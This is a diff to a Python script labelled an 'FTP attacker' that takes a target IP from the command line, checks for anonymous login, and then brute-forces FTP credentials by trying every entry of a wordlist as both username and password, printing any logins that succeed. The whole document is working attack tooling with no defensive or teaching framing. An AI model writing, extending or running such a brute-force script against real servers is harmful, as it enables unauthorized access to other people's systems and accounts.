@@ -1,5 +1,6 @@
 # Implementing FTP attacker
 import ftplib
+import os, sys, time
 
 # ANSI codes for font colors
 class colors:
@@ -16,27 +17,35 @@ def anonLogin(IP):
         ftp.quit()
     except Exception as e:
         print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
+        print(e)
 
 def ftpBruteForce(IP):
-    ftp = ftplib.FTP(IP)
+    f = open('100-credentials-list.txt', 'r')
+
+    for word in f.readlines():
+        word = word.strip('\n')
+        try:
+            ftp = ftplib.FTP(IP, timeout=1)
+            ftp.login(word,word)
+            print(f"[{colors.GREEN}+{colors.RESET}] Login successful using {word}:{word}")
+            ftp.quit()
+            time.sleep(3)
+        except Exception as e:
+            print(f"[{colors.RED}-{colors.RESET}] Login failed using {word}:{word}")
+
+def main():
     try:
-        f1 = open('10-million-password-list-top-100000.txt', 'r')
-        usernames = f1.read()
-        usernames = usernames.split('\n')
-#        print(usernames)
-
-        #f2 = open('10-million-password-list-top-100000.txt', 'r')
-        i = 0
-        while(i != len(usernames)):
-            #username = username.strip('\n')
-            username = usernames[i]
-            for password in f1.readlines():
-                password = password.strip('\n')
-                print(f"{username}:{password}")
-            i+=1
+        target = sys.argv[1]
+        checker = target.split('.')
+        if(len(checker) == 4):
+            print(f"Target locked: {target}\n")
+            anonLogin(target)
+            ftpBruteForce(target)
+        else:
+            print(f"[{colors.RED}-{colors.RESET}] Incorrect argument")
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"[{colors.RED}-{colors.RESET}] Incorrect arguments")
+        print(f"Error:{e}")
+        print("INPUT FORMAT: python3 brutal.py <TARGET IP>")
 
-target = input("Enter the IP address of the target: ")
-#anonLogin(target)
-ftpBruteForce(target)
+main()
